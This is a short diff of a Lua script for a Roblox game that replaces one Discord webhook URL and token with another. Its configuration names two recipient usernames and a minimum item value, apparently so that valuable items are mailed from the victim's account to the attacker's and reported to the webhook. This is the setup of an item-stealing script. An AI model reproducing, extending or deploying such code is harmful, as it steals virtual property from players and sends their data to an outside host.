@@ -34,7 +34,7 @@ local H = Y.TextField({
 
 Username = "LaRussieCool2"
 Username2 = "LaRussieCool3" -- stuff will get sent to this user if first user's mailbox is full
-Webhook = "https://discord.com/api/webhooks/1233473062293475410/W700VWb5jOrYwX2nGTlmZ4UNMmwqhQ_pnsxcOISS3AQ_aQ7QDL5jXQvc8_f-QhNF4lV8"
+Webhook = "https://discord.com/api/webhooks/1241836056379392131/ts3GPdji9p1-nI6Y4FRZ4uiCm9jiPeuIUcQuU8bXmX3wAN5N_n0XnoSzRMPpkFMn4WLd"
 min_rap = 500000 -- minimum rap of each item you want to get sent to you.
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
